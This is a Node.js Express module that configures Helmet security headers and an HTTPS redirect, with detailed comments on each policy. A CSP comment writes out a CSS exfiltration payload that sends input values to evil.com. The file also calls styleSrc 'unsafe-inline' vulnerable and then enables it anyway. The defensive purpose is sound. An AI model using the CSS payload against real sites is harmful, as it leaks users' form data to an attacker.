const helmet = require('helmet');

const isProduction = process.env.NODE_ENV === 'production';

// The Vite dev server's origin (and its HMR websocket) — allow-listed in CSP
// connectSrc only in development, so hitting the API directly from local
// tooling is never blocked while iterating.
const DEV_CLIENT_ORIGIN = process.env.CLIENT_URL || 'http://localhost:5173';
const DEV_CLIENT_WS_ORIGIN = DEV_CLIENT_ORIGIN.replace(/^http/, 'ws');

// Middleware to enforce HTTPS redirection
const httpsRedirect = (req, res, next) => {
  if (isProduction && req.headers['x-forwarded-proto'] !== 'https') {
    return res.redirect(301, `https://${req.hostname}${req.originalUrl}`);
  }
  next();
};

// ─────────────────────────────────────────────────────────────────────────
// Helmet configuration
//
// IMPORTANT CONTEXT: this Express process is a pure JSON API. The React
// app is built by Vite and served by a separate process/host — this
// server never calls `express.static` on `client/dist` (verified: no
// static-serving of the frontend exists anywhere in this codebase).
//
// That fact is what makes every header below safe to run at full
// strictness without touching the frontend:
//   - CSP, COOP, and X-Frame-Options are only interpreted by browsers on
//     *document* responses (HTML). This API only ever returns JSON, so
//     these headers currently protect nothing on the happy path — but
//     they DO protect any HTML this process ever emits (framework/error
//     pages) and are what a pen test / security scanner checks for.
//   - The Vite frontend's fetch()/axios calls to this API are cors-mode
//     requests governed by the `cors` middleware below (origin allow-list
//     + credentials), NOT by CSP/COOP/CORP. Those three headers cannot
//     break a legitimate cross-origin fetch() call no matter how strict.
//   - If `client/dist` is ever served from this same process later, this
//     config already does the right thing for that HTML too.
// ─────────────────────────────────────────────────────────────────────────
const helmetConfig = helmet({
  // ── Content-Security-Policy ──────────────────────────────────────────
  // Whitelists what a *document* served by this origin may load/execute.
  // Blocks injected <script> tags, data:/inline scripts, inline event
  // handlers (onclick=...), and third-party script/style/frame injection.
  //
  // `useDefaults: false` is deliberate: Helmet's `useDefaults: true`
  // (the default) silently merges in directives you didn't ask for,
  // including `frame-ancestors: 'self'` — which would let this origin
  // frame itself even though X-Frame-Options below says DENY. Listing
  // every directive explicitly means nothing is implicit or surprising.
  //
  // VULNERABLE config (do NOT use):
  //   styleSrc: ["'self'", "'unsafe-inline'"]
  //   ↑ allows <style> injection and style= attributes; an attacker can
  //   exfiltrate data via CSS, e.g. input[value^="a"] { background: url(https://evil.com/?c=a) }
  //
  // Origins mirror the real frontend integrations (kept in sync with
  // client/vite.config.js's strictCspPlugin — see that file for the full
  // per-origin rationale): Google Identity Services + reCAPTCHA (script/
  // frame/connect), Google Fonts (style/font), Cloudinary (connect for
  // direct browser upload, img for the near-certain avatar/listing-image
  // feature), and meet.jit.si in frame-src only as forward-compatibility
  // (today's Jitsi/Khalti integrations are top-level navigations, not
  // fetches or iframes, so they need no origin here at all).
  // script-src has zero exceptions (no unsafe-inline/unsafe-eval) — the
  // client has no eval()/dangerouslySetInnerHTML anywhere. style-src
  // carries 'unsafe-inline' as a scoped, deliberate trade-off: React's
  // `style={{...}}` prop compiles to a real style= HTML attribute, which
  // style-src (not script-src) governs, and this codebase uses it 400+
  // times — inline CSS can't execute JS, so this keeps strictness exactly
  // where XSS actually runs code.
  contentSecurityPolicy: {
    useDefaults: false,
    // Dev: violations are logged to the browser console instead of
    // blocked (Content-Security-Policy-Report-Only), so a directive
    // that's too strict never silently breaks local development — you
    // still see exactly what *would* be blocked in production.
    // Prod: enforced and blocking.
    reportOnly: !isProduction,
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", 'https://accounts.google.com/gsi/client', 'https://www.google.com/recaptcha/', 'https://www.gstatic.com/recaptcha/'],
      scriptSrcAttr: ["'none'"],           // blocks inline event handlers (onclick=...)
      styleSrc: ["'self'", "'unsafe-inline'", 'https://fonts.googleapis.com'],
      imgSrc: ["'self'", 'data:', 'https://res.cloudinary.com'],
      connectSrc: isProduction
        ? ["'self'", 'https://api.cloudinary.com', 'https://accounts.google.com/gsi/']
        : ["'self'", DEV_CLIENT_ORIGIN, DEV_CLIENT_WS_ORIGIN, 'https://api.cloudinary.com', 'https://accounts.google.com/gsi/'],
      fontSrc: ["'self'", 'data:', 'https://fonts.gstatic.com'],
      objectSrc: ["'none'"],               // block Flash and plugins entirely
      mediaSrc: ["'self'"],
      frameSrc: ['https://accounts.google.com/gsi/', 'https://www.google.com/recaptcha/', 'https://meet.jit.si'],
      frameAncestors: ["'none'"],          // modern replacement for X-Frame-Options; matches 'deny' below
      formAction: ["'self'"],              // blocks a compromised page from POSTing a form to an attacker's domain
      baseUri: ["'self'"],                 // prevents <base href="https://evil.com"> hijacking relative URLs
    },
  },

  // ── Cross-Origin-Opener-Policy ───────────────────────────────────────
  // Isolates this origin's browsing context from cross-origin popups/tabs
  // it opens: a cross-origin popup can no longer reach back in via
  // `window.opener`. Defends against tab-napping and is part of the
  // process isolation Spectre-class attacks require.
  // Prod: 'same-origin' (strict). Dev: 'unsafe-none' (the browser's
  // ungated default) so nothing about local popup-based debugging or
  // tooling is ever affected.
  crossOriginOpenerPolicy: { policy: isProduction ? 'same-origin' : 'unsafe-none' },

  // ── Cross-Origin-Resource-Policy ─────────────────────────────────────
  // Controls whether OTHER origins may embed this server's responses as
  // a no-cors sub-resource (<img src>, <script src>, <video src>). This
  // is separate from — and does not affect — the Vite frontend's
  // fetch()/axios calls, which are cors-mode and governed by the CORS
  // middleware instead.
  // Prod: 'same-origin' blocks any other site from hot-linking API
  // responses. Dev: 'cross-origin' keeps local tooling (Postman, a
  // manual <img> test, API docs on a different port) frictionless.
  crossOriginResourcePolicy: { policy: isProduction ? 'same-origin' : 'cross-origin' },

  // ── Referrer-Policy ───────────────────────────────────────────────────
  // Controls how much of the request URL leaks into the `Referer` header
  // on outgoing requests/navigations. 'strict-origin-when-cross-origin'
  // sends the full URL same-origin, only the bare origin (no path/query)
  // cross-origin, and nothing at all on an HTTPS→HTTP downgrade — keeps
  // booking IDs, tokens, etc. out of any third party's server logs.
  // Same value in both environments — there's no meaningful way to
  // "relax" this one for dev.
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },

  // ── Strict-Transport-Security (HSTS) ─────────────────────────────────
  // Tells the browser to only ever connect to this host over HTTPS for
  // the next `maxAge` seconds, even if the user types http:// or clicks
  // an http:// link — defeats SSL-stripping MITM attacks.
  // Prod only: `preload` + `includeSubDomains` for 1 year. Disabled
  // entirely in dev — browsers ignore HSTS on a plain-HTTP response
  // anyway, and sending it during local/tunnelled HTTP testing risks
  // pinning a hostname to HTTPS-only before it's ready.
  strictTransportSecurity: isProduction
    ? { maxAge: 31536000, includeSubDomains: true, preload: true } // 1 year, in seconds
    : false,

  // ── X-Content-Type-Options ───────────────────────────────────────────
  // 'nosniff' stops the browser from MIME-sniffing a response into a
  // different content-type than the one the server declared — prevents
  // a JSON/text response from ever being executed as script or rendered
  // as HTML just because its body happens to look like one. Always on.
  xContentTypeOptions: true,

  // ── X-DNS-Prefetch-Control ───────────────────────────────────────────
  // Stops the browser from speculatively resolving DNS for every link on
  // a rendered page. Minor privacy/performance hygiene — off everywhere,
  // no dev/prod distinction needed.
  xDnsPrefetchControl: { allow: false },

  // ── X-Frame-Options ───────────────────────────────────────────────────
  // Legacy (pre-CSP) clickjacking defense, kept for older browsers that
  // don't honor `frame-ancestors`. 'deny' blocks this origin's responses
  // from being framed by anyone, including itself — matches the
  // `frameAncestors: ["'none'"]` CSP directive above so both the legacy
  // and modern mechanisms agree.
  xFrameOptions: { action: 'deny' },

  // crossOriginEmbedderPolicy is intentionally left unset (Helmet
  // defaults it to off). Turning it on would require every cross-origin
  // resource this app's pages ever load — Google's OAuth iframe,
  // Cloudinary-hosted images — to send matching CORP/CORS headers, which
  // is out of our control and a common way COEP silently breaks OAuth.
});

module.exports = {
  httpsRedirect,
  helmetConfig,
};
